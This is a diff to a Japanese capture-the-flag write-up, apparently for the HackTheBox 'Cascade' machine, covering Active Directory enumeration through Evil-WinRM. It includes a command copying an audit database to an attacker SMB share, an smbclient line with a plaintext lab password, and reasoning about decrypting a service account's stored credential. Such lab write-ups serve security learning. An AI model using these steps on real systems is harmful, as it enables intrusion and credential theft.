@@ -444,9 +444,8 @@ Mode                LastWriteTime         Length Name
 -a----       10/27/2019   6:34 AM        1246720 SQLite.Interop.dll
 ```
 batを確認、CascAudit.exeを実行している  
-実際にbatを動かしてもdbファイルが見つからなそうな感じだったので、  
-CascAudit.exeにdbを指定して実行  
-dbファイルに書き込みしている挙動だが、読み込み専用なのでうまくいってはなさそう
+実際にbatを動かしてもdbファイルが見つからなそうな感じだったので、CascAudit.exeにdbを指定して実行  
+dbファイルに書き込みしている挙動だが、読み込み専用フォルダ内なので書き込みは失敗しているっぽい
 ```powershell
 *Evil-WinRM* PS C:\Shares\Audit> cat RunAudit.bat
 CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
@@ -481,8 +480,8 @@ SMB         10.129.188.71  445    CASC-DC1         [*] Copying "DB\Audit.db" to 
 SMB         10.129.188.71  445    CASC-DC1         [+] File "DB\Audit.db" was downloaded to "/home/kali/Audit.db"
 ```
 dbファイルをオープン  
-Ldapテーブルにクレデンシャルのようなものを発見  
-しかしパスワードスプレーをしてもログインできず、またbase系でデコードも文字化けしたのでデコードできず
+LdapテーブルにSTEP2で確認できたユーザ「arksvc」のパスワードっぽいものを発見  
+しかしパスワードスプレーをしてもログインできず、またbase系でデコードしたが文字化けする模様
 ```sh
 └─$ sqlite3 Audit.db      
 SQLite version 3.46.1 2024-08-13 09:16:08
@@ -514,13 +513,97 @@ Id  uname   pwd                       domain
 sqlite> SELECT * FROM Misc;
 
 ```
-今度は書き込み可能なdbファイルに対してCascAudit.exeを動かす
+今度はdbファイルを書き込み可能なフォルダにコピーして、CascAudit.exeを動かすしてdbファイルを確認すると
 ```powershell
-*Evil-WinRM* PS C:\Shares\Audit> .\CascAudit.exe C:\Users\s.smith\audit.db
+*Evil-WinRM* PS C:\Shares\Audit> copy DB\audit.db C:\Users\s.smith\audit.db
 
 *Evil-WinRM* PS C:\Shares\Audit> .\CascAudit.exe C:\Users\s.smith\audit.db
 Found 2 results from LDAP query
 Successfully inserted 2 row(s) into database
+
+*Evil-WinRM* PS C:\Shares\Audit> copy C:\Users\s.smith\audit.db \\10.10.16.11\share\
+```
+新たにDeletedUserAuditテーブルに2行追加されていた。  
+改めてDistinguishedNameを確認すると、削除済オブジェクトであることが分かる  
+```sh
+└─$ sqlite3 audit.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+
+sqlite> .mode column
+
+sqlite> SELECT * FROM DeletedUserAudit;
+Id  Username   Name                                      DistinguishedName                                           
+--  ---------  ----------------------------------------  ------------------------------------------------------------
+6   test       Test                                      CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Delete
+               DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d  d Objects,DC=cascade,DC=local                               
+
+7   deleted    deleted guy                               CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN
+               DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef  =Deleted Objects,DC=cascade,DC=local                        
+
+9   TempAdmin  TempAdmin                                 CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=D
+               DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a  eleted Objects,DC=cascade,DC=local                          
+
+11  CASC-WS1$  CASC-WS1                                  CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=De
+               DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe  leted Objects,DC=cascade,DC=local                           
+
+12  TempAdmin  TempAdmin                                 CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=D
+               DEL:f0cc344d-31e0-4866-bceb-a842791ca059  eleted Objects,DC=cascade,DC=local
+```
+ただ削除済オブジェクトを確認できるグループは「AD Recycle Bin」である  
+しかし現ユーザのs.smithはそのグループに所属していないため、なぜCascAudit.exe経由で削除済オブジェクトを参照できるのか
+```powershell
+*Evil-WinRM* PS C:\shares\audit> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+dbファイルのLdapテーブル内にユーザ名arksvcを確認したが、「AD Recycle Bin」グループに所属していることを確認  
+おそらくCascAudit.exeはdbファイルのLdapテーブル内のarksvcクレデンシャルを使用して削除済オブジェクトを参照していると推測  
+ということはCascAudit.exe内にLdapテーブル内のパスワードを復号できる鍵がハードコーディングされているかも
+```powershell
+*Evil-WinRM* PS C:\shares\audit> net user arksvc /do
+User name                    arksvc
+Full Name                    ArkSvc
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 5:18:20 PM
+Password expires             Never
+Password changeable          1/9/2020 5:18:20 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/10/2025 8:26:11 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *AD Recycle Bin       *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
 ```
 ```sh
 └─$ smbclient -U 'cascade.local/s.smith%sT333ve2' -c 'recurse ON; dir' //10.129.188.71/Audit$
